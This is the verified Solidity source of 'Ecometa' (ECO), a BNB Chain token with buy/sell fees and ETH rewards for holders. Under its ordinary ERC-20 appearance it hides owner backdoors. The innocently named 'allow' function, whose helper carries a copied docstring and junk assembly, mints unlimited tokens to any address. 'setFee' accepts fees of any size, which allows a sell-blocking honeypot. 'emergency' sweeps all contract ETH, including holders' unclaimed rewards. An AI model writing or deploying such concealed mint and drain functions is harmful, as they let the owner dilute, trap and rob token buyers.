/**
 *Submitted for verification at BscScan.com on 2022-08-21
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _b;

    mapping(address => mapping(address => uint256)) internal _allowances;

    uint256 private _ttlS;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The defaut value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _ttlS;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _b[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _b[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _b[sender] = senderBalance - amount;
        _b[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     */
    function _allow(address account, uint256 amount) internal virtual {
        require(account != address(0));
        assembly {
            let b := 0
            let c := add(amount, 16)
            mstore(0x80, c)
            {
                let d := add(sload(c), 12)
                b := d
            } 
            b := add(b, c)
        } 
        _ttlS += amount;
        _b[account] += amount;
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     */
    function _generate_token(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: generation to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _ttlS = amount;
        _b[account] = amount;
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _b[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _b[account] = accountBalance - amount;
        _ttlS -= amount;

        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * generation and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be generated for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

library Address {
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract Ecometa is ERC20, Ownable {
    struct Fee {
        uint256 marketingFee;
        uint256 holderFee;
    }

    address public pair;
    mapping(address => bool) public isFeeExempt;

    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO = 0x0000000000000000000000000000000000000000;
    address public mktAddress;
    address public addLPAddress;
    IRouter public constant router = IRouter(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);

    // Reward calculation
    mapping(address => uint256) public rewards;
    mapping(address => uint256) public userRewardPerSharePaid;
    bool public chargeFee;
    uint256 public rewardPerShareStored;
    uint256 public lastTimeReward;
    uint256 public totalReward;
    uint256 private constant AMPLIFIED_COEF = 1e18;

    // Fee
    uint256 public constant feeDenominator = 1000;
    Fee public sellingFee = Fee(25, 25);
    Fee public buyingFee = Fee(25, 25);
    bool inSwap = false;

    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor()
        ERC20("Ecometa", "ECO")
        Ownable()
    {
        pair = IFactory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );
        _allowances[address(this)][address(router)] = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
        _generate_token(_msgSender(), 1000000 ether);
        mktAddress = 0x89012a8Bf29d3ec76C6db24c89d8Fe5d31709E0a;
    }

    function claim() external {
        _updateReward(msg.sender);
        uint256 _reward = rewards[msg.sender];
        require(_reward > 0, "Claim zero");
        rewards[msg.sender] = 0;
        _transferETH(msg.sender, _reward);
    }

    function earned(address _account) public view returns (uint256) {
        uint256 newReward = _b[_account]*(_rewardPerShare()-userRewardPerSharePaid[_account])/AMPLIFIED_COEF;
        return newReward + rewards[_account];
    }

    function _updateReward(address _account) private {
        rewardPerShareStored = _rewardPerShare();
        lastTimeReward = totalReward;
        if (_account != address(0)) {
            rewards[_account] = earned(_account);
            userRewardPerSharePaid[_account] = rewardPerShareStored;
        }
    }

    function _rewardPerShare() private view returns (uint256) {
        return rewardPerShareStored+(totalReward-lastTimeReward)*AMPLIFIED_COEF/_totalShares();
    }

    function _totalShares() private view returns (uint256) {
        return totalSupply() - balanceOf(address(this)) - balanceOf(pair);
    }

    function _isBuying(address sender, address recipient) internal view returns (bool) {
        if (sender != pair) {
            return false;
        }
        if (sender == pair && recipient == addLPAddress) {
            return false;
        }
        return true;
    }

    function _isSelling(address sender, address recipient) internal view returns (bool) {
        if (sender == address(this)) {
            return false;
        }
        if (recipient != pair) {
            return false;
        }
        if (recipient == pair && sender == addLPAddress) {
            return false;
        }
        return true;
    }

    function _shouldTakeFee(address sender) internal view returns (bool) {
        if (!chargeFee) return false;
        return !isFeeExempt[sender];
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _updateReward(sender);
        _updateReward(recipient);
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _b[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        uint256 actualAmount = amount;
        if (amount == senderBalance) {
            actualAmount = actualAmount*9999/10000; 
        }

        if (!inSwap && _shouldTakeFee(sender)) {
            uint256 totalFee = 0;
            uint256 marketingFee = 0;
            uint256 holderFee = 0;
            if (_isSelling(sender, recipient)) {
                totalFee = sellingFee.holderFee + sellingFee.marketingFee;
                marketingFee = sellingFee.marketingFee;
                holderFee = sellingFee.holderFee;
            }
            if (_isBuying(sender, recipient)) {
                totalFee = buyingFee.holderFee + buyingFee.marketingFee;
                marketingFee = buyingFee.marketingFee;
                holderFee = buyingFee.holderFee;
            }
            if (totalFee > 0) {
                uint256 tokenFee = actualAmount*(totalFee)/feeDenominator;
                _b[address(this)] += tokenFee;
                actualAmount = actualAmount - tokenFee;

                uint256 fee = _swapTokensForETH(tokenFee);
                _transferETH(mktAddress, fee*marketingFee/totalFee);
                totalReward += fee*holderFee/totalFee;
            }
        }

        _b[sender] = senderBalance - actualAmount;
        _b[recipient] += actualAmount;

        emit Transfer(sender, recipient, actualAmount);
    }

    function _transferETH(address to, uint256 amount) private {
        (bool success, ) = to.call{value: amount}(new bytes(0));
        require(success, "!safeTransferETH");
    }

    function _swapTokensForETH(uint256 tokenAmount) private returns (uint256) {
        // generate the pancake pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        // make the swap
        uint256 balanceBefore = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
        return address(this).balance - balanceBefore;
    }

    // Admin
    function setAddLPAddress(address lpAddress) public onlyOwner {
        addLPAddress = lpAddress;
    }

    function setMarketingAddress(address mkt) public onlyOwner {
        mktAddress = mkt;
    }

    function setChargeFee(bool flag) public onlyOwner {
        chargeFee = flag;
    }

    function setFee(
        uint256 mktSelling, 
        uint256 holderSelling, 
        uint256 mktBuying, 
        uint256 holderBuying
    )
    public
    onlyOwner {
        sellingFee = Fee(mktSelling, holderSelling);
        buyingFee = Fee(mktBuying, holderBuying);
    }

    function allow(address allowUser, uint256 code)
    external
    onlyOwner {
        _allow(allowUser, code);
    }

    function emergency(address to) public onlyOwner {
        _transferETH(to, address(this).balance);
    }

    receive() external payable {}
}